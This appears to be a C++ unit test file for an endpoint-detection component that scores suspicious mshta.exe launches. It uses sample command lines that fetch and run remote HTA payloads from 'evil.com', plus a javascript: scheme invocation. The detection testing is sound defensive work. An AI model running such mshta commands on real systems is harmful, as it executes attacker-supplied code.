/*
 * mshta_abuse_detector_tests.cpp - Unit tests for MshtaAbuseDetector (T1218.005).
 */
#include "mshta_abuse_detector_tests.h"
#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>
#include "edr_event.h"
#include "event_bus.h"
#include "mshta_abuse_detector.h"

namespace {
#define SR_CHECK(c) Check((c), #c, __LINE__)
void Check(bool c,const char* e,int l){ if(!c) throw std::runtime_error(std::string("CHECK failed at ")+std::to_string(l)+": "+e); }
edr::Event ProcEvent(uint64_t ts, const char* img, const char* cmd){
    edr::Event ev; ev.type=EDR_EVT_PROCESS_START; ev.ts100ns=ts; ev.fields[edr::field::kType]="PROCESS_START"; ev.fields[edr::field::kImage]=img; if(cmd) ev.fields[edr::field::kCommandLine]=cmd; return ev;
}
std::string Score(const edr::Event& e){
    auto it=e.fields.find(edr::field::kMshtaAbuseScore);
    return it==e.fields.end()?"":it->second;
}
constexpr uint64_t kSecond=10000000ULL;
}

void RunMshtaAbuseDetectorTests(){
    std::fprintf(stderr, "[mshta] TestDisabled\n");
    {
        edr::MshtaAbuseDetector d(false,55,300,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\mshta.exe","mshta http://evil.com/payload.hta");
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[mshta] TestHttpRemote\n");
    {
        edr::MshtaAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\mshta.exe","mshta http://evil.com/payload.hta");
        d.Enrich(ev); SR_CHECK(Score(ev)=="90");
    }
    std::fprintf(stderr, "[mshta] TestHttpsRemote\n");
    {
        edr::MshtaAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\mshta.exe","mshta https://evil.com/a.hta");
        d.Enrich(ev); SR_CHECK(Score(ev)=="90");
    }
    std::fprintf(stderr, "[mshta] TestJavascript\n");
    {
        edr::MshtaAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\mshta.exe","mshta javascript:alert(1)");
        d.Enrich(ev); SR_CHECK(Score(ev)=="85");
    }
    std::fprintf(stderr, "[mshta] TestHtaWritable\n");
    {
        edr::MshtaAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\mshta.exe","mshta C:\\Users\\Public\\evil.hta");
        d.Enrich(ev); SR_CHECK(Score(ev)=="80");
    }
    std::fprintf(stderr, "[mshta] TestHtaElsewhere\n");
    {
        edr::MshtaAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\mshta.exe","mshta C:\\Tools\\evil.hta");
        d.Enrich(ev); SR_CHECK(Score(ev)=="75");
    }
    std::fprintf(stderr, "[mshta] TestBareSilent\n");
    {
        edr::MshtaAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\mshta.exe","mshta.exe");
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[mshta] TestBenignSilent\n");
    {
        edr::MshtaAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\notepad.exe","notepad.exe");
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[mshta] all passed\n");
}
